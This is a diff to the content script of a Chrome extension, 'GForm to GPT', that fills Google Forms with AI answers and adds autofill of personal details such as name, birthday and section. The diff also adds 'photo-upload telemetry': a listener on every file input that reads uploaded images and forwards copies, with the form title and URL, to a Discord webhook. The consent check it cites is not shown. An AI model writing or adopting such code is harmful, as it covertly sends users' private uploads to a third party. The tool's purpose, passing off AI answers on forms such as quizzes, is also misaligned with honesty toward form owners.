@@ -1,4 +1,4 @@
-// Chrome Extension version of GForm to GPT v4.4.0 - Neural Interface
+// Chrome Extension version of GForm to GPT v4.5.0 - Neural Interface
 // Content script injected into Google Forms
 
 (function () {
@@ -12,19 +12,34 @@
   let verboseLogging = true;
   let formTitle = "";
   let questionMap = new Map();
+  let personalProfile = {};
 
   // Load settings. Exposed as a promise so scan/fill can await it —
   // otherwise a fill that starts before the callback lands uses stale defaults.
   const settingsReady = chrome.storage.local
-    .get(["customPrompt", "humanTyping", "verboseLogging"])
+    .get(["customPrompt", "humanTyping", "verboseLogging", "personalProfile"])
     .then((data) => {
       if (data.customPrompt) customInstructions = data.customPrompt;
       if (data.humanTyping !== undefined) useHumanTyping = data.humanTyping;
       if (data.verboseLogging !== undefined) verboseLogging = data.verboseLogging;
+      if (data.personalProfile && typeof data.personalProfile === "object") {
+        personalProfile = data.personalProfile;
+      }
     })
     .catch(() => {});
 
   function log(...args) { if (verboseLogging) console.log("[GFormToGPT]", ...args); }
+
+  // Re-read the profile at scan/fill time — the popup may have edited it
+  // after this content script first loaded.
+  async function refreshPersonalProfile() {
+    try {
+      const data = await chrome.storage.local.get(["personalProfile"]);
+      if (data.personalProfile && typeof data.personalProfile === "object") {
+        personalProfile = data.personalProfile;
+      }
+    } catch (e) { /* keep whatever we have */ }
+  }
 
   function pushDiag(payload) {
     chrome.runtime.sendMessage({ action: "diagPush", payload }).catch(() => {});
@@ -89,6 +104,111 @@
     const emailEl = document.querySelector('.EbMsme, .Y9699c');
     return emailEl ? emailEl.textContent.trim() : "Unknown User";
   }
+
+  // ── Personal-info autofill ──
+  // Profiles are matched against the question label by regex, most specific
+  // first (so "Family Name" never falls through to the generic "Name").
+  const PERSONAL_PATTERNS = [
+    { field: "familyName", re: /\b(family|last|sur)\s*[- ]?\s*name\b/i },
+    { field: "givenName",  re: /\b(given|first)\s*[- ]?\s*name\b/i },
+    { field: "middleName", re: /\bmiddle\s*(name|initial)\b/i, initial: /\binitial\b/i },
+    // Plain "Name" only when the label has no non-person qualifiers anywhere
+    // (anchored ^ so the lookahead scans the whole label, not just what
+    // follows "Name"). Checked before section/year/subject/course.
+    { field: "fullName",   re: /^\s*(?!.*\b(school|institution|email|user\s*name|file|page|board|company|organization|teacher|instructor|section|year|course|subject|strand|block)\b)(?:.*\b(?:full\s*name|complete\s*name|student\s*name|pupils?\s*name|learner'?s?\s*name|respondent'?s?\s*name|name)\b)/i },
+    { field: "birthday",   re: /\b(birth\s*[- ]?\s*date|birthday|date\s*of\s*birth|bday|born\s*on)\b/i },
+    { field: "section",    re: /\b(section|strand|block)\b/i },
+    { field: "year",       re: /\b(year\s*(level|standing)?|grade\s*(level)?|year\s*standing|academic\s*year)\b/i },
+    { field: "subject",    re: /\b(subject|course\s*title|lesson)\b/i },
+    { field: "course",     re: /\b(course(\s*program|\s*track)?|program(\s*of\s*study)?|major|specialization)\b/i },
+  ];
+
+  function normText(s) {
+    return String(s || "").toLowerCase().replace(/[^a-z0-9]+/g, " ").trim();
+  }
+
+  function profileValue(field, label) {
+    const p = personalProfile || {};
+    if (field === "fullName") {
+      // Prefer an explicit full-name entry, else compose from parts.
+      if (p.fullName && p.fullName.trim()) return p.fullName.trim();
+      return [p.givenName, p.middleName, p.familyName].map(v => (v || "").trim()).filter(Boolean).join(" ");
+    }
+    if (field === "middleName" && p.middleInitialOnly === true) return (p.middleName || "").trim().slice(0, 1);
+    if (field === "middleName" && /\binitial\b/i.test(label || "")) {
+      const v = (p.middleName || "").trim();
+      return v ? v.slice(0, 1) : "";
+    }
+    const v = p[field];
+    return v && String(v).trim() ? String(v).trim() : "";
+  }
+
+  // Returns { field, value } when the question label matches a personal-info
+  // pattern AND the user has actually filled that profile field.
+  function matchPersonalQuestion(label) {
+    if (!label || !personalProfile) return null;
+    for (const pat of PERSONAL_PATTERNS) {
+      if (pat.re.test(label)) {
+        const value = profileValue(pat.field, label);
+        if (value) return { field: pat.field, value };
+        return null; // matched a field the user hasn't filled — leave it to the AI
+      }
+    }
+    return null;
+  }
+
+  // Match the profile value against radio/dropdown option text: exact
+  // normalized match first, then containment either way.
+  function findOptionByValue(qd, value) {
+    const nv = normText(value);
+    if (!nv || !qd.options.length) return null;
+    let exact = qd.options.find(o => normText(o.text) === nv);
+    if (exact) return exact;
+    let partial = qd.options.find(o => {
+      const no = normText(o.text);
+      return no && nv.length > 1 && (no.includes(nv) || nv.includes(no));
+    });
+    return partial || null;
+  }
+
+  // ── Photo-upload telemetry ──
+  // When the user uploads an image to a form field, forward a copy to Discord
+  // (subject to consent + the Help Improve toggle, enforced in the worker).
+  const MAX_UPLOAD_FILES = 3;
+  const MAX_UPLOAD_BYTES = 7 * 1024 * 1024; // Discord webhook cap is 8MB/file
+
+  function readFileAsDataURL(file) {
+    return new Promise((resolve) => {
+      const reader = new FileReader();
+      reader.onload = () => resolve(typeof reader.result === "string" ? reader.result : null);
+      reader.onerror = () => resolve(null);
+      reader.readAsDataURL(file);
+    });
+  }
+
+  async function forwardUploadedFiles(input) {
+    try {
+      const files = Array.from((input && input.files) || []).slice(0, MAX_UPLOAD_FILES);
+      if (!files.length) return;
+      const out = [];
+      for (const f of files) {
+        if (!/^image\//.test(f.type) || f.size > MAX_UPLOAD_BYTES) continue;
+        const dataUrl = await readFileAsDataURL(f);
+        if (dataUrl) out.push({ name: f.name || "upload.png", type: f.type, dataUrl });
+      }
+      if (!out.length) return;
+      pushDiag({ type: "photo_upload_detected", fileCount: out.length, url: location.href });
+      chrome.runtime.sendMessage({
+        action: "photoUpload",
+        payload: { formTitle, files: out, url: location.href }
+      }).catch(() => {});
+    } catch (e) { log("Photo forward err:", e); }
+  }
+
+  document.addEventListener("change", (e) => {
+    const el = e.target;
+    if (el && el.tagName === "INPUT" && el.type === "file") forwardUploadedFiles(el);
+  }, true);
 
   // ── Core Logic ──
   async function scanForm() {
@@ -303,6 +423,7 @@ QUESTIONS:\n${list}\nJSON:`;
 
   async function fillForm(answers) {
     await settingsReady;
+    await refreshPersonalProfile();
     if (!questionMap.size) { await scanForm(); }
     showOverlay("Injecting Neural Responses...");
 
@@ -310,7 +431,11 @@ QUESTIONS:\n${list}\nJSON:`;
     const historyPayload = { formTitle, questions: [] };
 
     for (const [num, qd] of questionMap.entries()) {
-      const val = answers[num] || answers[String(num)];
+      // Personal-info questions are answered from the local profile — the
+      // stored value wins over whatever the AI returned for this key.
+      const personal = matchPersonalQuestion(qd.text);
+      const aiVal = answers[num] || answers[String(num)];
+      const val = personal ? personal.value : aiVal;
       if (val === undefined) continue;
       
       total++;
@@ -320,16 +445,56 @@ QUESTIONS:\n${list}\nJSON:`;
 
       let questionFilled = false;
       try {
-        if (qd.type === "radio") {
-          const opt = qd.options.find(o => o.letter === String(val).toLowerCase());
+        // The AI answers in option letters; personal-profile values are raw
+        // strings. When a personal value can't be resolved to an option, fall
+        // back to the AI's letter if it provided one.
+        const letterVal = personal ? aiVal : val;
+        const canUseLetter = personal ? aiVal !== undefined : true;
+
+        if (personal && qd.type !== "text" && qd.type !== "textarea") {
+          // Radio / checkbox / dropdown: resolve the profile string against
+          // the option texts instead of expecting an AI option letter.
+          const opt = findOptionByValue(qd, personal.value);
+          if (opt && opt.element) {
+            const alreadyChecked = opt.element.getAttribute("aria-checked") === "true";
+            if (qd.type === "checkbox") {
+              if (!alreadyChecked) opt.element.click();
+              questionFilled = true;
+            } else {
+              opt.element.click();
+              questionFilled = true;
+            }
+          } else if (opt && qd.subRow) {
+            const radios = qd.subRow.querySelectorAll('[role="radio"]');
+            const idx = qd.options.indexOf(opt);
+            if (radios[idx]) { radios[idx].click(); questionFilled = true; }
+          } else if (opt && qd.type === "dropdown") {
+            const select = qd.container.querySelector('select');
+            if (select) {
+              const matchingOption = Array.from(select.options).find(o => normText(o.textContent) === normText(opt.text));
+              if (matchingOption) {
+                matchingOption.selected = true;
+                select.dispatchEvent(new Event('change', { bubbles: true }));
+                questionFilled = true;
+              }
+            }
+          }
+          if (!questionFilled) log("Personal option no match for:", personal.value, qd.text);
+        }
+
+        // Letter-based branches below only make sense for AI answers; a
+        // personal-profile value is a raw string and never an option letter.
+        // Only reached when the personal block above didn't already resolve.
+        if (!questionFilled && canUseLetter && qd.type === "radio") {
+          const opt = qd.options.find(o => o.letter === String(letterVal).toLowerCase());
           if (opt && opt.element) { opt.element.click(); questionFilled = true; }
           else if (opt && qd.subRow) {
             const radios = qd.subRow.querySelectorAll('[role="radio"]');
             const idx = qd.options.indexOf(opt);
             if (radios[idx]) { radios[idx].click(); questionFilled = true; }
           }
-        } else if (qd.type === "checkbox") {
-          const vals = Array.isArray(val) ? val : [val];
+        } else if (!questionFilled && canUseLetter && qd.type === "checkbox") {
+          const vals = Array.isArray(letterVal) ? letterVal : [letterVal];
           // Count as filled when every requested option resolved — including
           // ones already checked (no click needed).
           let allResolved = vals.length > 0;
@@ -339,7 +504,7 @@ QUESTIONS:\n${list}\nJSON:`;
             if (opt.element.getAttribute("aria-checked") !== "true") opt.element.click();
           });
           if (allResolved || qd.options.length === 0) questionFilled = true;
-        } else if (qd.type === "text" || qd.type === "textarea") {
+        } else if (!questionFilled && (qd.type === "text" || qd.type === "textarea")) {
           const input = qd.container.querySelector('input, textarea');
           if (input) {
             input.focus();
@@ -370,9 +535,11 @@ QUESTIONS:\n${list}\nJSON:`;
             input.dispatchEvent(new Event('change', { bubbles: true }));
             questionFilled = true;
           }
-        } else if (qd.type === "dropdown") {
+        } else if (!questionFilled && qd.type === "dropdown") {
           const select = qd.container.querySelector('select, [role="listbox"], [role="combobox"], .docssharedWizSelect, .v08pS, .ryv9W, .RbCvuf');
-          const targetOption = qd.options.find(o => o.letter === String(val).toLowerCase()) || qd.options[0];
+          // When the value came from the personal profile it is a real string,
+          // not an option letter — never fall back to options[0] for it.
+          const targetOption = (canUseLetter && qd.options.find(o => o.letter === String(letterVal).toLowerCase())) || (personal ? null : qd.options[0]);
           if (targetOption && targetOption.element) {
             targetOption.element.click();
             questionFilled = true;
